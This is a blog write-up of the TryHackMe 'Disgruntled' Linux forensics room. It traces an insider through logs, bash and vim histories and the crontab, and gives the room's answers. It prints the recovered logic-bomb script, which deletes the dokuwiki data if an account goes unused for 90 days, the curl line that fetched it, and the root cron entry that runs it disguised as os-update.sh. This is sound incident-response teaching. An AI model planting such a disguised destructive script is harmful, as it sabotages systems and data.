<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> THM CTF Disgruntled | NonoHM </title> <meta name="author" content="NonoHM "> <meta name="description" content="Welcome to my personnal website. I am currently a 2nd year student in the " but r et t program. i like doing sports and music besides learning new things in it.> <meta name="keywords" content="jekyll, jekyll-theme, portfolio-website, writeups, projects"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://nonohm.github.io/blog/2024/THM-CTF-Disgruntled/"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> NonoHM </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">THM CTF Disgruntled</h1> <p class="post-meta"> March 31, 2024 • NonoHM </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/thm"> <i class="fa-solid fa-hashtag fa-sm"></i> THM</a>   <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/linux"> <i class="fa-solid fa-hashtag fa-sm"></i> Linux</a>   <a href="/blog/tag/forensics"> <i class="fa-solid fa-hashtag fa-sm"></i> Forensics</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we will have to investigate into the CyberT’s IT departement guy’s machine to check if he has done anything malicious to CyberT’s assets.</p> <h2 id="task-3---nothing-suspicious-so-far">Task 3 - Nothing suspicious… So far</h2> <p>To start with, we check the informations about the OS with <code class="language-plaintext highlighter-rouge">cat /etc/os-release</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">NAME</span><span class="o">=</span><span class="s2">"Ubuntu"</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="s2">"18.04.5 LTS (Bionic Beaver)"</span>
<span class="nv">ID</span><span class="o">=</span>ubuntu
<span class="nv">ID_LIKE</span><span class="o">=</span>debian
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">"Ubuntu 18.04.5 LTS"</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">"18.04"</span>
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/"</span>
<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">"https://help.ubuntu.com/"</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">"https://bugs.launchpad.net/ubuntu/"</span>
<span class="nv">PRIVACY_POLICY_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
<span class="nv">VERSION_CODENAME</span><span class="o">=</span>bionic
<span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>bionic
</code></pre></div></div> <p>We can see this is a normal Ubuntu 18.04.5.</p> <p>Then, we check what are the users on the machine in the <code class="language-plaintext highlighter-rouge">passwd</code> file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
cybert:x:1001:1001::/home/cybert:/bin/bash
it-admin:x:1002:1002:,,,:/home/it-admin:/bin/bash
</code></pre></div></div> <p>These three users are the only “normal” ones available on the system.</p> <p>When we look into sudoers file, we can see <em>cybert</em> and <em>it-admin</em> have all privileges on the system.</p> <pre><code class="language-sudoers"># User privilege specification
root    ALL=(ALL:ALL) ALL
cybert  ALL=(ALL:ALL) ALL
it-admin ALL=(ALL:ALL) ALL
</code></pre> <p>Instructions gives us a hint to look if there is any installed package using privileged account. Thus, we will look for anyone who had used the <code class="language-plaintext highlighter-rouge">apt</code> command using <code class="language-plaintext highlighter-rouge">cat /var/log/auth.log* | grep -i apt</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dec 28 06:19:01 ip-10-10-168-55 <span class="nb">sudo</span>:   cybert : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/cybert <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/apt <span class="nb">install </span>dokuwiki
</code></pre></div></div> <p>We can see that user <em>cybert</em> has installed <em>dokuwiki</em>.</p> <p>To know what DokuWiki is, it is an open-source wiki software that enables easy collaborative website content management through text files, without requiring a database backend.</p> <p>It looks like a normal package to install.</p> <h3 id="questions">Questions</h3> <p><strong>The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/usr/bin/apt install dokuwiki</code></em></p> <p><strong>What was the present working directory (PWD) when the previous command was run?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/home/cybert</code></em></p> <h2 id="task-4---lets-see-if-you-did-anything-bad">Task 4 - Let’s see if you did anything bad</h2> <p>The instructions here says that IT was supposed to only install a service so we need to check if there is unrelated commands.</p> <p>We can see it in the cybert’s bash history using the command <code class="language-plaintext highlighter-rouge">cat /home/cybert/.bash_history</code>.</p> <p>Here are the suspicious commands we could find:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>adduser it-admin
<span class="nb">sudo </span>visudo
su it-admin
<span class="nb">exit
sudo </span>passwd root
su root
<span class="nb">exit
</span>su root
nano /etc/ssh/sshd_config 
<span class="nb">sudo </span>nano /etc/ssh/sshd_config 
</code></pre></div></div> <p>It seems that the IT guy have added a new user named <em>it-admin</em>, changed sudoers file, changed root password and sshd configuration.</p> <p>We can see the sudoers file has been changed by user <em>cybert</em> on December 28 at 6:27 AM.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dec 22 07:58:24 ip-10-10-158-38 <span class="nb">sudo</span>:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 <span class="nb">sudo</span>:   cybert : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/cybert <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/sbin/visudo
</code></pre></div></div> <p>When looking at the <em>it-admin</em>’s bash history with <code class="language-plaintext highlighter-rouge">cat /home/it-admin/.bash_history </code>, we are able to see a questionable script named <em>bomb.sh</em> downloaded by our friend.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.158.38:8080/bomb.sh <span class="nt">--output</span> bomb.sh
<span class="nb">sudo </span>vi bomb.sh
<span class="nb">ls
rm </span>bomb.sh
<span class="nb">sudo </span>nano /etc/crontab
<span class="nb">exit</span>
</code></pre></div></div> <h3 id="questions-1">Questions</h3> <p><strong>Which user was created after the package from the previous task was installed?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">it-admin</code></em></p> <p><strong>A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Dec 28 06:27:34</code></em></p> <p><strong>A script file was opened using the “vi” text editor. What is the name of this file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">bomb.sh</code></em></p> <h2 id="task-5---bomb-has-been-planted-but-when-and-where">Task 5 - Bomb has been planted. But when and where?</h2> <p>Here, we need to know where the script came from and what it contains.</p> <p>From the previous history command, we saw that the command used to retrieve the script is <code class="language-plaintext highlighter-rouge">curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code>.</p> <p>By checking vi history using <code class="language-plaintext highlighter-rouge">cat /home/it-admin/.viminfo</code>, we see that the file has been saved somewhere else at <code class="language-plaintext highlighter-rouge">/bin/os-update.sh</code>. This explains why the <em>bomb.sh</em> has been deleted.</p> <pre><code class="language-vi"># Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
</code></pre> <p>Using <code class="language-plaintext highlighter-rouge">stat /bin/os-update</code>, we get information on when it has been last modified.</p> <pre><code class="language-stat">Access: 2022-12-28 06:29:43.998004273 +0000
Modify: 2022-12-28 06:29:43.998004273 +0000
Change: 2022-12-28 06:29:43.998004273 +0000
</code></pre> <p>Lastly, we need to know what this script does. In order to know that, we will check its content.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 2022-06-05 - Initial version</span>
<span class="c"># 2022-10-11 - Fixed bug</span>
<span class="c"># 2022-10-15 - Changed from 30 days to 90 days</span>
<span class="nv">OUTPUT</span><span class="o">=</span><span class="sb">`</span>last <span class="nt">-n</span> 1 it-admin <span class="nt">-s</span> <span class="s2">"-90days"</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="sb">`</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$OUTPUT</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">rm</span> <span class="nt">-r</span> /var/lib/dokuwiki
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA</span><span class="se">\n</span><span class="s2">-mistermeist3r
"</span> <span class="o">&gt;</span> /goodbye.txt
<span class="k">fi</span>
</code></pre></div></div> <p>We are now able to understand what the script does. Firstly, it gets if the user it-admin connected wihtin 90 days. Then, if not, it will erase the dokuwiki site and write a vengeance message into <em>goodbye.txt</em>. This is probably made to piss off the company if our friend got fired.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the command used that created the file bomb.sh?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code></em></p> <p><strong>The file was renamed and moved to a different directory. What is the full path of this file now?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/bin/os-update.sh</code></em></p> <p><strong>When was the file from the previous question last modified? (Format: Month Day HH:MM)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Dec 28 06:29</code></em></p> <p><strong>What is the name of the file that will get created when the file from the first question executes?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">goodbye.txt</code></em></p> <h2 id="task-6---following-the-fuse">Task 6 - Following the fuse</h2> <p>Now that we know how the script work, we need to know when it will be executed. We remember that our friend modified crontab file, so will check it with <code class="language-plaintext highlighter-rouge">cat /etc/crontab</code>.</p> <pre><code class="language-cron">0 8     * * *   root    /bin/os-update.sh
</code></pre> <p>This script will be executed at 8 AM every day by root user.</p> <h3 id="question">Question</h3> <p><strong>At what time will the malicious file trigger? (Format: HH:MM AM/PM)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">08:00 AM</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>In summary, our investigation into the Disgruntled THM CTF scenario revealed suspicious actions by an insider in CyberT’s IT department. By thoroughly examining user accounts, permissions (sudoers), logs, and command histories (bash and vim), we uncovered a hidden plan to harm the company’s systems and found a malicious script intended to cause damage. This script would delete all the files of the dokuwiki if the user has not logged into this machine in the last 90 days.<br> This scenario emphasizes the need for strong security measures and proactive threat detection.</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/THM-CTF-Wonderland/">THM CTF Wonderland</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Identity-and-Access-Management/">THM Identity and Access Management</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/THM-CTF-Investigating-Windows/">THM CTF Investigating Windows</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Introduction-to-Cryptography/">THM Introduction to Cryptography</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Security-Engineer-Intro/">THM Security Engineer Intro</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2024 NonoHM . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?da39b660470d1ba6e6b8bf5f37070b6e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>